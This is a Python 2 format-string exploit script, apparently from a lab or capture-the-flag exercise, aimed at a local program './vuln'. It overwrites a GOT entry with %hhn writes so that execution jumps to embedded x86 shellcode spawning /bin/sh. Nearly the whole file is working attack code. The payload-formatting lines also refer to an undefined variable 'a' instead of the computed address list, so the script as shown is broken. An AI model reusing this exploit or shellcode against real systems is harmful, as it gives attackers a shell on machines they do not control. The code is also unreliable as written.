#!/usr/bin/env python2.7
# coding: UTF-8

import struct
from subprocess import *
# from libformatstr import FormatStr

addr_got = 0x0804a01c
addr_buf = 0xffffcda8

'''
$ ./vuln 'AAAA.%6$08x'
AAAA.41414141
'''

index = 6

# null free
shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

buf = struct.pack('<I', addr_got)
buf += struct.pack('<I', addr_got + 1)
buf += struct.pack('<I', addr_got + 2)
buf += struct.pack('<I', addr_got + 3)
buf += shellcode

buf_addr_list = map(ord, struct.pack('<I', addr_buf + 16)) # [b8, cd, ff, ff]
buf_addr_list[3] = ((buf_addr_list[3] - buf_addr_list[2] - 1) % 0x100) + 1 # 0x1ff % 0x100 = 0xff
buf_addr_list[2] = ((buf_addr_list[2] - buf_addr_list[1] - 1) % 0x100) + 1
buf_addr_list[1] = ((buf_addr_list[1] - buf_addr_list[0] - 1) % 0x100) + 1
buf_addr_list[0] = ((buf_addr_list[0] - len(buf) - 1) % 0x100) + 1

buf += "%%%dc%%%d$hhn" % (a[0], index)
buf += "%%%dc%%%d$hhn" % (a[1], index + 1)
buf += "%%%dc%%%d$hhn" % (a[2], index + 2)
buf += "%%%dc%%%d$hhn" % (a[3], index + 3)

with open('buf', 'wb') as f:
    f.write(buf)

p = Popen(['./vuln', buf])
p.wait()
